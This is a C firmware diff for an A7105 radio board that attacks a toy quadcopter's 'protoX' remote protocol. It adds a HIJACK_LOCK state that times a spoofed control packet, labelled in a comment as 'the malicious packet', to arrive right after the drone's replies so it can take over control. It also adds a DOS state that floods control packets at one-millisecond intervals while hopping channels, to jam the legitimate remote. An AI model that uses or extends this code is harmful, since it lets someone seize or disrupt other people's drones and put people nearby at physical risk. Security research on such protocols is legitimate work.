@@ -25,7 +25,7 @@ typedef struct {
 	uint8_t unknown9;
 } __attribute__((packed)) controlPacket_t;
 
-typedef enum {IDLE, SEND_PACKET, WAIT_FOR_REPLY, RUNNING, FIND_REMOTE, SNIFFER, HIJACKING} remoteState_t;
+typedef enum {IDLE, SEND_PACKET, WAIT_FOR_REPLY, RUNNING, FIND_REMOTE, SNIFFER, HIJACK_LOCK, HIJACKING, DOS} remoteState_t;
 typedef enum {COUNT1, COUNT2, COUNT3} connectState_t;
 
 extern uint16_t VCP_DataTx   (uint8_t* Buf, uint32_t Len);
@@ -177,7 +177,11 @@ void protoXRemoteStart() {
 }
 
 void protoXRemoteForceStart() {
-	remoteState = HIJACKING;
+	remoteState = HIJACK_LOCK;
+}
+
+void protoXRemoteDOS() {
+	remoteState = DOS;
 }
 
 void protoXSnifferStart() {
@@ -378,6 +382,44 @@ int32_t protoXProcess() {
 			break;
 		}
 
+		// 
+		// Trying to figure out when to send the malicious packet
+		// 
+		case HIJACK_LOCK: {
+
+			int32_t newInt = GPIO_ReadInputDataBit(GPIOD, GPIO_Pin_2); // PD2 is connected to GIO1
+			// TODO - Use interrupts and flags instead of polling
+
+			// Heard it!
+			if ((newInt == 0) && (oldInt == 1) && (a7105ReadReg(MODE) & MODE_TRER) == 0) {
+				
+				a7105Strobe(STROBE_FIFO_RD_RST);
+				a7105Read(FIFO_DATA, packetBuff, 16);
+				a7105Strobe(STROBE_RX);
+
+				// This is a packet reply from the quad
+				if((packetBuff[0] & 0xE0) == 0xE0) {
+					timeout = tickMs + 2;
+				}
+			}
+
+			if(timeout && (tickMs >= timeout)){
+				timeout = 0;
+				protoXSendPacket((uint8_t *)&controlPacket, 15);
+				a7105Strobe(STROBE_RX);
+			}
+
+			oldInt = newInt;
+
+			// Don't let the processor go to sleep while we're pairing
+			stopWFI = 1;
+			break;
+		}
+
+		//
+		// This one just transmits at 5ms intervals and hopes for the best
+		// (Hint: It's not working so well...)
+		//
 		case HIJACKING: {
 
 			GPIO_SetBits(GPIOD, GPIO_Pin_13);
@@ -403,6 +445,28 @@ int32_t protoXProcess() {
 			// We're dealing with 10 ms timings, so waking up on systick should be ok
 			stopWFI = 0;
 
+			break;
+		}
+
+		case DOS: {
+
+			if(tickMs >= timeout){
+				timeout = tickMs + 1;
+
+				if(channelRefresh) {
+					channelRefresh = 0;
+					a7105SetChannel(channels[savedBestChannel]);
+					timeToCHSwitch = tickMs + 50;
+				} else if(tickMs >= timeToCHSwitch) {
+					a7105SetChannel(0xA5);
+					channelRefresh = 1;
+				}
+
+				protoXSendPacket((uint8_t *)&controlPacket, 15);
+			}
+
+			stopWFI = 1;
+			
 			break;
 		}
 
